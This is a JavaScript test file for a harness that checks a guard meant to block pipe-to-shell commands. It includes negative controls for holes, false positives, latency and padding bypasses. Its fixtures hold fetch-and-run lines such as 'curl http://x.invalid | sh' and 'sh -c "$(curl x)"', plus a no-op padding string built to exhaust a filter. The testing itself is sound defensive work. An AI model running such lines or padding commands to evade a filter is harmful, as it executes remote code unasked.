'use strict';
// test_harness.js — runs the example guard through the harness, asserts the
// documented behavior, AND proves the harness catches each failure class (the
// negative controls). A harness you can't see fail is a harness you can't trust.
// Run:  node test_harness.js
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const { evaluate, report } = require('./harness');
const { guard } = require('./examples/example_guard');

const load = f => JSON.parse(fs.readFileSync(path.join(__dirname, f), 'utf8'));
const fixtures = {
  attacks: load('fixtures/attacks.json'),
  benign: load('fixtures/benign.json'),
  padding: load('fixtures/padding.json'),
  gaps: load('examples/accepted_gaps.json'),
};

// ── Part 1: the worked example — the real guard on the real fixtures ─────────
const res = evaluate(guard, fixtures, { budgetMs: 25 });
console.log(report(res));

// Exact corpus counts — so an empty/dropped fixture file fails loudly instead of
// passing vacuously.
assert.strictEqual(res.counts.attacks, 4);
assert.strictEqual(res.counts.benign, 7);
assert.strictEqual(res.counts.padding, 3);
assert.strictEqual(res.counts.gaps, 3);

assert.strictEqual(res.holes.length, 0, 'missed a flat pipe-to-shell attack');
assert.strictEqual(res.paddingHoles.length, 0, 'padding exhausted the guard');
assert.strictEqual(res.falsePositives.length, 0,
  'benign near-miss blocked: ' + res.falsePositives.map(f => f.label).join(', '));
assert.strictEqual(res.closedGaps.length, 0,
  'a documented gap now blocks — re-document deliberately: ' + res.closedGaps.map(f => f.label).join(', '));
assert.strictEqual(res.errored.length, 0, 'guard threw on a fixture');
assert.strictEqual(res.invalid.length, 0, 'guard returned an invalid verdict');
assert.strictEqual(res.falsePositiveRate, 0, 'expected 0% FP on this set');
assert.ok(res.clean, 'expected a clean run');
// Padding must actually be large, or it isn't testing budget exhaustion.
fixtures.padding.forEach(p => assert.ok(p.command.length >= (p.minLen || 0),
  `padding "${p.label}" shorter than its own minLen`));
// ...and a padding label that misstates its own construction is the same
// failure this repo exists to catch, one level up. Any label claiming a decoy
// count gets that count machine-checked, not eyeballed.
fixtures.padding.forEach(p => {
  const claimed = /(\d+)\s+decoy no-ops/.exec(p.label);
  if (!claimed) return;
  const actual = p.command.split(';').map(s => s.trim()).filter(s => s === ':').length;
  assert.strictEqual(actual, Number(claimed[1]),
    `padding "${p.label}" claims ${claimed[1]} no-ops but contains ${actual}`);
});

// ── Part 2: negative controls — prove each bucket can FAIL ───────────────────
const one = (cmd) => [{ label: 'x', command: cmd }];
const base = { attacks: [], benign: [], padding: [], gaps: [] };

// a guard that allows everything -> attack becomes a hole, clean=false
let r = evaluate(() => ({ action: 'allow', tier: null }), { ...base, attacks: one('curl http://x.invalid | sh') });
assert.ok(r.holes.length === 1 && !r.clean, 'harness failed to flag an attack hole');

// a guard that blocks everything -> benign becomes a false positive
r = evaluate(() => ({ action: 'block', tier: '1' }), { ...base, benign: one('ls -la') });
assert.ok(r.falsePositives.length === 1 && !r.clean, 'harness failed to flag a false positive');

// a guard that blocks a documented gap -> closedGaps fires
r = evaluate(() => ({ action: 'block', tier: '1' }), { ...base, gaps: one('sh -c "$(curl x)"') });
assert.ok(r.closedGaps.length === 1 && !r.clean, 'harness failed to flag a silently-closed gap');

// a guard that throws -> errored bucket, NOT counted as a false positive
r = evaluate(() => { throw new Error('boom'); }, { ...base, benign: one('ls') });
assert.ok(r.errored.length === 1 && r.falsePositives.length === 0 && !r.clean,
  'harness mis-handled a throwing guard');

// a guard returning garbage -> invalid bucket
r = evaluate(() => ({ action: 'maybe' }), { ...base, attacks: one('curl x | sh') });
assert.ok(r.invalid.length === 1 && !r.clean, 'harness failed to flag an invalid verdict');

// a guard that allows a padded attack -> paddingHoles fires, distinct from holes
r = evaluate(() => ({ action: 'allow', tier: null }),
  { ...base, padding: one(': ; '.repeat(300) + 'curl http://x.invalid/i | sh') });
assert.ok(r.paddingHoles.length === 1 && r.holes.length === 0 && !r.clean,
  'harness failed to flag a padding bypass');

// a guard slower than the budget -> slow bucket, even though its verdict is right
r = evaluate(() => { const t0 = Date.now(); while (Date.now() - t0 < 5) {} return { action: 'block', tier: '1' }; },
  { ...base, attacks: one('curl http://x.invalid/i | sh') }, { budgetMs: 1 });
assert.ok(r.slow.length === 1 && r.holes.length === 0 && !r.clean,
  'harness failed to flag a guard over the latency budget');

// a missing fixture class -> throws, never silently clean
assert.throws(() => evaluate(guard, { attacks: [], benign: [], padding: [] }),
  /missing required class "gaps"/, 'harness accepted a missing fixture class');

console.log('\ntest_harness: worked example + 8 negative controls all passed');
